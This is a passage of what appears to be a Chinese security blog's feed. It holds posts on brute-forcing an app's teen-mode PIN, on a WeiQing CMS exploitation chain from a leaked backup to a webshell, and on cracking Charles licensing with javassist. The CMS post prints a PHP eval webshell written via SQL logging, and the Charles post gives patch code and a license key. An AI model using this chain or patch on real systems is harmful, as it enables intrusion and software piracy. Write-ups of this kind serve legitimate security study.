alt="teenagers_mode文件"></p><p>发现一串神秘字符串，通过cmd5查询：c2890d44d06bafb6c7b4aa194857ccbc=md5(4578)。正好是设置的密码。</p><p>另外由于登录前可以看到所有的内容，而登录开启青少年模式的账户时，就会进入青少年模式，只能看特定内容。所以退出账户重新登录并抓包，可以看到如下的请求。</p><p><img src="19.png" alt="抓包"></p><p>也成功找到经过md5加密的密码。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这次是因为B站开启了青少年模式，后来密码给忘记了。当时只想着用爆破的方式来解决了，没有想着抓包或者查看保存的数据文件。后来爆破出密码后，又发现可以通过查看配置文件的方式和抓包的方式找到密码。而且之前是打算用ios作为测试的，后来因为效率的问题，才转战安卓。如果使用安卓的话，自动化测试工具也很多，例如UIAutomator2等。</p><p>本文其实就是一个流水账，记录一下自己找回青少年模式密码的过程，可能比较粗糙。有关IOS真机调试更详细的教程可以参考<a href="https://www.jianshu.com/p/ae8846736dba" target="_blank" rel="noopener">使用Appium进行iOS的真机自动化测试</a> 。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成&lt;code&gt;0000&lt;/code&gt;~&lt;code&gt;9999&lt;/code&gt;的密码字典，应该就可以找到正确的密码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="自动化测试" scheme="https://fuping.site/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Appium" scheme="https://fuping.site/tags/Appium/"/>
    
      <category term="自动化测试" scheme="https://fuping.site/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
      <category term="青少年模式" scheme="https://fuping.site/tags/%E9%9D%92%E5%B0%91%E5%B9%B4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>记一次从源代码泄漏到后台获取webshell的过程</title>
    <link href="https://fuping.site/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/"/>
    <id>https://fuping.site/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/</id>
    <published>2020-04-18T06:22:33.000Z</published>
    <updated>2020-04-23T11:13:21.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。</p><a id="more"></a><h2 id="0x02-WEBSHELL获取的尝试"><a href="#0x02-WEBSHELL获取的尝试" class="headerlink" title="0x02 WEBSHELL获取的尝试"></a>0x02 WEBSHELL获取的尝试</h2><p>有了数据库备份文件，然后找一下是否有用户的信息，能否登录系统。</p><h3 id="1-登录后台"><a href="#1-登录后台" class="headerlink" title="1.登录后台"></a>1.登录后台</h3><p>解压备份文件可以从<code>data/backup</code>目录下找到数据库的备份，从中找到了用户表<code>ims_users</code>。</p><p><img src="01.png" alt="01"></p><p>知道了用户名、加密后的密码和salt，我们去看一下密码加密的算法。</p><p>我这里直接搜索<code>password</code>，在forget.ctrl.php中找到了一处。</p><p><img src="02.png" alt="02"></p><p>密码加密方法是<code>$password = md5($password . $member_info[&#39;salt&#39;] . $_W[&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]);</code>。是根据<code>原密码+salt+authkey</code>的形式进行拼接，然后进行md5加密。</p><p>authkey在<code>data/config.php</code>文件中。</p><p><img src="03.png" alt="03"></p><p>现在salt和authkey以及加密后的密码已经获得，开始去解密密码是多少。这里我们将<code>salt</code>和<code>authkey</code>拼接为新的<code>salt</code>，然后使用<code>md5($pass.$salt)</code>的加密方式进行解密。</p><p><img src="04.png" alt="04"></p><p>解密后即可登录后台。</p><p><img src="05.png" alt="05"></p><p>接下来就是webshell的获取了。</p><p>本以为都已经是管理员了，获取shell就是分分钟的事，然而事情远远没有那么简单。</p><h3 id="2-失败的获取shell过程"><a href="#2-失败的获取shell过程" class="headerlink" title="2.失败的获取shell过程"></a>2.失败的获取shell过程</h3><p>根据搜索发现，该cms后台获取shell的方法也不少，主要还是围绕执行sql这里。但我这里都失败了，就简单的提一下。</p><p><strong>第一种方法：</strong></p><p>站点管理-附件设置-图片附件设置-支持文件后缀，任意添加一个类型，例如添加<code>pppppp</code>。</p><p>然后执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> ims_core_settings <span class="keyword">SET</span> <span class="keyword">value</span> = <span class="keyword">replace</span>(<span class="keyword">value</span>, <span class="string">'pppppp'</span>, <span class="string">'php '</span>)</span><br></pre></td></tr></table></figure><p>更新缓存，之后就可以上传<code>&quot;*.php &quot;</code>文件了。但是有限制，适用于apache下，而且版本有限制。目标站不使用该方法的原因有二，一是该系统上传的位置是腾讯云COS上，二是server是Tengine。</p><p><strong>第二种方法：</strong></p><p>第二种方法也是和sql执行有关，利用日志文件写shell。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;  <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;  <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'/var/www/html/1.php'</span>;   <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>  <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><p>或者通过慢查询（slow_query_log）的方法写shell。但目标系统也是失败，执行sql的时候报错。</p><p>还有一些其他的方法，这里测试也是失败的，就不再列举了。</p><h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><p>病急乱投医，熬成老中医。既然之前的方法不管用，只好去翻代码吧，找找是否有新的利用方式。翻出之前的一个文档，从里面找到之前的审计过程，看能否对现在有用。结果打开发现只有一个数据包和还有一句未实现的结论。</p><p><img src="06.png" alt="06"></p><p>没办法，只好重新围着这个点继续审计，看是否能有所进展。</p><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h3><p>打开文件<code>web/source/cloud/dock.ctrl.php</code>，找到执行的<code>download</code>方法。</p><p><img src="07.png" alt="07"></p><p>代码比较简单，我大概说一下这里的流程：</p><p>如果请求包非Base64加密的格式，那么<code>$data</code>就是请求包的内容。然后对<code>$data</code>进行发序列化返回<code>$ret</code>，接下来获取<code>$ret[&#39;file&#39;]</code>并Base64解密返回<code>$file</code>。当存在<code>gzcompress</code>和<code>gzuncompress</code>这两个函数时，就会利用<code>gzuncompress</code>函数对<code>$file</code>进行解压操作。</p><p>将获取的<code>$file</code>进行md5加密后，与<code>$ret[&#39;path&#39;]</code>以及获取的<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>进行拼接为<code>$string</code>。当满足<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>非空并且<code>$string</code>md5加密后的结果与<code>$ret[&#39;sign&#39;]</code>一致时，才可以进行下面的操作。下面就是文件的写入了，根据<code>$ret[&#39;path&#39;]</code>进行判断，然后写入的位置不一样。</p><p>这里关键的一点就是<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>这个值的获取。这个是利用authcode函数对<code>cache_load(cache_system_key(&#39;cloud_transtoken&#39;))</code>进行解密获取的。</p><p><code>authcode</code>函数位于<code>framework/function/global.func.php</code>文件中。</p><p><img src="08.png" alt="08"></p><p>由上面代码可以看出，要想使用<code>authcode</code>加解密，需要知道<code>$GLOBALS[&#39;_W&#39;][&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]</code>，在上面提到过，authkey在<code>data/config.php</code>文件中。</p><p>那么如果想任意写文件，就需要知道<code>cache_system_key(&#39;cloud_transtoken&#39;)</code>的内容了。</p><h3 id="2-cloud-transtoken的获取"><a href="#2-cloud-transtoken的获取" class="headerlink" title="2.cloud_transtoken的获取"></a>2.cloud_transtoken的获取</h3><p>通过搜索发现，这个值是在文件<code>framework/model/cloud.mod.php</code>中的<code>cloud_build_transtoken</code>函数中被写入的，通过进入<code>cache_write</code>方法，发现会写入数据库中。</p><p><img src="09.png" alt="09"></p><p>既然会写入到数据库中，而且目标系统下载到时候有数据库的备份文件，我们直接在数据库备份文件中搜索<code>cloud_transtoken</code>。结果并没有找到，可能原因是没有写入<code>cloud_transtoken</code>的时候就进行了数据库备份。</p><p>我们往上回溯，看哪里调用了<code>cloud_build_transtoken</code>。</p><p>发现了其中的一条利用链：</p><p><img src="10.png" alt="10"></p><p>当访问<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> 时，就会判断站点ID和通信密钥是否为空（即站点是否注册），如果站点注册了，就会调用<code>cloud_site_info()</code>函数获取站点信息。函数<code>cloud_site_info()</code>调用了<code>cloud_api(&#39;site/info&#39;)</code>，这里的method为<code>site/info</code>，所以继续调用<code>cloud_build_transtoken</code>从会而将<code>cloud_transtoken</code>的内容写入数据库。然后通过数据库备份的功能，就可以看到数据库中保存的<code>cloud_transtoken</code>，进而可以利用之前的分析写shell。</p><h3 id="3-自定义数据库备份"><a href="#3-自定义数据库备份" class="headerlink" title="3.自定义数据库备份"></a>3.自定义数据库备份</h3><p>由于数据库备份需要关闭站点，为了不影响目标站点的使用，这里我们搭建一个环境演示一下过程（需要注册站点）。</p><p>登录成功后更新缓存，然后访问<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> ，关闭站点后进行数据库备份。</p><p><img src="11.png" alt="11"></p><p>发现可以获取<code>cloud_transtoken</code>，但是数据库目录和文件的名字是随机的。</p><p><img src="12.png" alt="12"></p><p>而且如果备份文件里面的数据库文件不是最新的，那么即使获取到<code>cloud_transtoken</code>也无法利用，我们需要最新的备份文件。</p><p>然后我们看一下数据库备份是怎么实现的，打开<code>web/source/system/database.ctrl.php</code>。</p><p><img src="13.png" alt="13"></p><p>发现文件夹和分卷名可以自定义，如果为空或不满足条件的话，文件夹是时间戳、下划线和8位随机字符串的拼接，分卷名是<code>volume-10位随机字符串-1.sql</code>的形式，既然可以自定义，那么就简单多了。</p><p>访问链接<a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 进行数据库备份，则数据库备份文件的地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql">http://ip:port/data/backup/123/volume-456-1.sql</a></p><p><img src="14.png" alt="14"></p><p>然后就可以随时获取<code>cloud_transtoken</code>了。接下来就可以进行shell的获取了。</p><h3 id="4-获取WEBSHELL"><a href="#4-获取WEBSHELL" class="headerlink" title="4.获取WEBSHELL"></a>4.获取WEBSHELL</h3><p>根据上面的分析，<code>cloud_transtoken</code>、<code>authkey</code>已经知道了，接下来就是构造payload了。</p><p><img src="15.png" alt="15"></p><p>然后请求<a href="http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download">http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download</a> ，data为生成的payload。</p><p><img src="16.png" alt="16"></p><p><img src="17.png" alt="17"></p><p>可以进行任意文件的写入，对目标系统进行测试，也成功获取了shell。</p><h3 id="5-延伸"><a href="#5-延伸" class="headerlink" title="5.延伸"></a>5.延伸</h3><p>上面是因为有系统文件备份，然后获取<code>/data/config.php</code>中的<code>authkey</code>。如果没有文件备份，登录了一个管理员权限的用户，能否获取shell呢。答案也是可以的。</p><p>该系统有一个木马查杀功能，可以根据这个功能读取文件内容。</p><p><img src="18.png" alt="18"></p><p>选择一个目录，然后提交并拦截数据库包，修改查杀目录为<code>data/.</code>，特征函数为<code>password</code>。然后就可以看到查杀结果，获取<code>authkey</code>的值。</p><p><img src="19.png" alt="19"></p><p>在对最新版 v2.5.7（202002140001）进行木马查杀的时候，可以从查杀报告中看到该文件，但是查看时提示文件不存在。原因是最新版利用正则对文件路径进行匹配，如果匹配成功就提示文件不存在（windows下可以利用大写路径绕过）。</p><p><img src="20.png" alt="20"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>根据上面对分析过程，该漏洞的利用过程如下：</p><p>1.成功登录后台，且拥有管理员权限。</p><p>2.更新缓存（非必须），访问链接<a href="http://ip:port/web/index.php?c=cloud&amp;a=profile">http://ip:port/web/index.php?c=cloud&amp;a=profile</a> 写入<code>cloud_transtoken</code>到数据库中。</p><p>3.关闭站点并进行使用自定义的目录进行数据库备份，链接地址：<a href="http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456">http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456</a> 。然后下载数据库备份，地址为：<a href="http://ip:port/data/backup/123/volume-456-1.sql">http://ip:port/data/backup/123/volume-456-1.sql</a> （多个分卷的话文件名为volume-456-2.sql、volume-456-3.sql… ）,然后找到<code>cloud_transtoken</code>。 </p><p>4.生成payload，请求<a href="http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download">http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download</a> ，写入shell。</p><p>总的来说，利用上述方法获取shell需要满足两个条件，第一是拥有一个管理员权限的用户，第二就是该站点注册了云服务。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://fuping.site/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="微擎" scheme="https://fuping.site/tags/%E5%BE%AE%E6%93%8E/"/>
    
      <category term="代码审计" scheme="https://fuping.site/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Charles的一次破解之旅</title>
    <link href="https://fuping.site/2019/10/25/charles-crack/"/>
    <id>https://fuping.site/2019/10/25/charles-crack/</id>
    <published>2019-10-24T16:00:00.000Z</published>
    <updated>2020-07-14T07:20:42.773Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用<strong>javassist</strong>对java软件进行修改，达到破解的目的。</p><a id="more"></a><p>先看一下实现的效果。使用<code>任意用户名+任意key</code>就可以进行激活。</p><p><img src="01.png" alt="注册"></p><p>激活成功</p><p><img src="02.png" alt="注册成功"></p><p>如果想换用户名，取消注册再次注册即可。</p><p>Help-&gt;Unregister Charles…</p><p><img src="03.png" alt=""></p><p>接下来我们来分析一下注册的流程，以及如何去破解。</p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>首先打开软件(版本为v4.2.8)，未注册时需要等待10s的动画才可进入，而且30分钟后会退出软件。</p><p>打开Help-&gt;Register Charles…，看到注册界面。</p><p><img src="04.png" alt=""></p><p>使用<code>jadx-gui</code>打开charles.jar，搜索字符串<code>Register Charles</code>，定位到<code>com.xk72.charles.gui.frames.RegisterFrame</code>中。</p><p><img src="05.png" alt=""></p><p><img src="06.png" alt=""></p><p>其中一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.bRegister.addActionListener(<span class="keyword">new</span> NBdE(<span class="keyword">this</span>));</span><br></pre></td></tr></table></figure><p>可以看到注册按钮绑定的事件，当按下注册按钮时，执行<code>new NBdE(this)</code>。</p><p>跟进到<code>com.xk72.charles.gui.frames.NBdE</code></p><p><img src="07.png" alt=""></p><blockquote><p>其中的trim为Registered Name，trim2为License Key</p></blockquote><p>首先对输入的name和key进行判断，需要其长度要大于0，然后调用<code>qHTb.DdNM(trim, trim2)</code>方法，并对其返回的结果进行判断。当不为null时，注册失败。反之则注册成功。</p><p>跟进<code>com.xk72.charles.qHTb</code>中，调用的是<code>DdNM(String str1,String str2)</code></p><p><img src="08.png" alt=""></p><blockquote><p>由之前的推断可以知道，当<code>qHTb.DdNM(str1, str2)=null</code>时注册成功，这里DdNM(String str1,String str2)函数中如果正常执行<code>twLa = new qHTb(str, str2);</code>则会返回null，否则返回异常的信息。所以需要看<code>twLa = new qHTb(str, str2);</code>是否抛出异常，如果未异常，则返回为<code>null</code>，即注册成功；反之，注册失败。</p></blockquote><p>继续跟进构造函数<code>qHTb(String str1,String str2)</code>。</p><p><img src="09.png" alt=""></p><p>构造函数<code>qHTb(String str1,String str2)</code>调用了<code>qHTb(String str1,String str2,int i)</code></p><p>其主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">qHTb</span><span class="params">(String str, String str2, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">boolean</span> z = <span class="keyword">false</span>;</span><br><span class="line">     <span class="keyword">this</span>.gbef = <span class="keyword">false</span>;<span class="comment">//表示是否注册成功 true为成功</span></span><br><span class="line">     <span class="keyword">this</span>.lPpR = <span class="string">"Unregistered"</span>;<span class="comment">//注册成功后为输入的Registered Name</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         String replaceAll = str.replaceAll(<span class="string">"[  ᠎    　]"</span>, <span class="string">" "</span>);<span class="comment">//替换特殊字符</span></span><br><span class="line">         <span class="keyword">if</span> (DdNM(twLa(replaceAll, str2, <span class="number">4</span>))) &#123;</span><br><span class="line">             z = <span class="keyword">true</span>;</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!replaceAll.equals(str)) &#123;</span><br><span class="line">             z = DdNM(twLa(str, str2, <span class="number">4</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (!z) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> LicenseException(DdNM(<span class="number">2</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">this</span>.lPpR = str;<span class="comment">//注册成功，lPpR为Registered Name</span></span><br><span class="line">         <span class="keyword">this</span>.gbef = <span class="keyword">true</span>;<span class="comment">//注册成功</span></span><br><span class="line">     &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> LicenseException(DdNM(<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>因此要使注册成功，首先需要<code>twLa(String str,String str2, int i)</code>在调用的时候无异常，并且需要<code>DdNM(long j)</code>返回为true。</p><p><img src="10.png" alt=""></p><p>由以上代码可知，当<code>j=lGuB</code>时，返回为true。<code>lGuB</code>为已知常量。即需要满足<code>j=5911726755176091652L;</code>时，<code>DdNM(long j)</code>返回为true。</p><p>接下来看<code>twLa(String str,String str2, int i)</code>。</p><p><img src="11.png" alt=""></p><blockquote><p>由于jadx-gui查看twLa未反编译完全，为了查看方便，这里用Idea打开。</p></blockquote><p><img src="12.png" alt=""></p><p>twLa方法的三个参数，var1是注册的name，var2是注册的key，var3是4.</p><p><img src="13.png" alt=""></p><p>分割线以上的为注册码的校验，下面为对用户名进行操作。可以从以上的代码看出，在用户名操作时没有抛出异常的行为，所以从这里来看，注册成功与否与用户名没有直接关系（因为从之前的推断可知，当出现异常时注册失败）。</p><p>所以这里的破解思路是：</p><p>使用<strong>javassist</strong>修改<code>twLa(String str,String str2, int i)</code>中的第二个参数，为一个可用的注册码，然后使该函数的返回值为<code>5911726755176091652L</code>即可。</p><p>当然也可以直接修改<code>DdNM(long j)</code>返回为true，修改DdNM<code>(String str1, String str2)</code>第二个参数为可用的key。这样修改以后，在软件运行注册的时候，可以达到任意用户名和任意key注册的效果。</p><blockquote><p>当然修改的方法不止这两种，知道注册流程后，修改就很容易了。</p></blockquote><p>接下来引入如何使用<strong>javassist</strong>来对软件进行修改。</p><h3 id="0x03-使用javassist进行修改"><a href="#0x03-使用javassist进行修改" class="headerlink" title="0x03 使用javassist进行修改"></a>0x03 使用javassist进行修改</h3><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库。虽然关于java字节码的处理有很多工具，如bcel，asm。不过这些都需要直接跟虚拟机指令打交道。而且Javassit 提供了更高级的API，无需掌握字节码指令的知识，对使用者要求较低。直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p><h4 id="v4-2-8的修改"><a href="#v4-2-8的修改" class="headerlink" title="v4.2.8的修改"></a>v4.2.8的修改</h4><p>根据上面的分析，修改v4.2.8时，需要修改<code>DdNM(long j)</code>返回为true，修改DdNM<code>(String str1, String str2)</code>第二个参数为可用的key，例如<code>C9D1226DB5B93C12D1</code>。</p><p>利用Javassist进行修改起来也很简单，具体实现代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">      pool.insertClassPath(<span class="string">"~/Desktop/charles.jar"</span>);</span><br><span class="line">      CtClass ctClass = pool.get(<span class="string">"com.xk72.charles.qHTb"</span>);</span><br><span class="line">      CtMethod ctm1 = ctClass.getDeclaredMethod(<span class="string">"DdNM"</span>,<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"long"</span>)&#125;);</span><br><span class="line">      ctm1.setBody(<span class="string">"return true;"</span>);<span class="comment">//修改返回值</span></span><br><span class="line">      </span><br><span class="line">      CtMethod ctm2 = ctClass.getDeclaredMethod(<span class="string">"DdNM"</span>,<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"java.lang.String"</span>),pool.get(<span class="string">"java.lang.String"</span>)&#125;);</span><br><span class="line">      ctm2.insertBefore(<span class="string">"$2=\"C9D1226DB5B93C12D1\";"</span>);<span class="comment">//修改第二个参数</span></span><br><span class="line"></span><br><span class="line">      ctClass.writeFile(<span class="string">"~/Desktop/"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后更新修改的内容，并替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar -uvf charles.jar com</span><br><span class="line"></span><br><span class="line">cp charles.jar /Applications/Charles.app/Contents/Java/</span><br></pre></td></tr></table></figure><p>然后再次打开Charles注册时就可以达到文章开头的效果了。</p><p>更改后的文件：<a href="https://fuping.site/files/qHTb.class">https://fuping.site/files/qHTb.class</a></p><blockquote><p>使用方法：新建文件夹com/xk72/charles，然后将class文件放入其中，执行<code>jar -uvf charles.jar com</code>。再替换charles.jar即可。</p></blockquote><h4 id="v4-5-4的修改"><a href="#v4-5-4的修改" class="headerlink" title="v4.5.4的修改"></a>v4.5.4的修改</h4><p>当时修改的时候最新版是v4.2.8，10.29号下载的是v4.5.1，还没来得及安装，再次查看最新版已经是v4.5.4了。</p><p>虽然更新了，其中类名和方法名改变了，但是注册的流程还是老样子。根据上面的思路可以进行修改。找到注册校验的类。</p><p><img src="14.png" alt=""></p><p>需要修改的类为<code>com.xk72.charles.DIWy</code>。</p><p>需要修改的方法：</p><p>1.<code>private boolean OZtq(long var1)</code>，返回值修改为true。</p><p>2.<code>public static String OZtq(String var0, String var1)</code>，第二个参数为可用的key。</p><p>修改的代码就不贴了，和上面的一样，修改一下类名和方法名即可。</p><p>打开Charles后任意用户名+任意注册码注册成功。</p><p><img src="15.png" alt=""></p><p>更改后的文件：<a href="https://fuping.site/files/DIWy.class">https://fuping.site/files/DIWy.class</a></p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>关于Charles破解的文章，网上有很多。大多数都是直接修改了注册的标志和注册的信息，本文也是提供了另外一种破解的思路。通过简单分析注册的流程，然后使用javassist进行java文件的修改，以此达到破解的目的。</p><p>关于更多Charles破解相关的文章，可以参考以下几篇：</p><p>[1].<a href="http://scz.617.cn:8/misc/201910241714.txt" target="_blank" rel="noopener">http://scz.617.cn:8/misc/201910241714.txt</a> （有详细注册码的算法以及注册机）</p><p>[2].<a href="http://www.520monkey.com/archives/1295" target="_blank" rel="noopener">http://www.520monkey.com/archives/1295</a> （有分析和修改）</p><p>[3].<a href="https://www.freebuf.com/sectool/205520.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/205520.html</a> （有详细的javassist使用）</p><p>…</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用&lt;strong&gt;javassist&lt;/strong&gt;对java软件进行修改，达到破解的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件破解" scheme="https://fuping.site/categories/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Charles破解" scheme="https://fuping.site/tags/Charles%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="软件破解" scheme="https://fuping.site/tags/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="javassist" scheme="https://fuping.site/tags/javassist/"/>
    
  </entry>
  
  <entry>
    <title>WinRAR漏洞复现过程</title>
    <link href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/"/>
    <id>https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/</id>
    <published>2019-02-21T09:43:56.000Z</published>
    <updated>2019-02-22T01:51:19.473Z</updated>
    
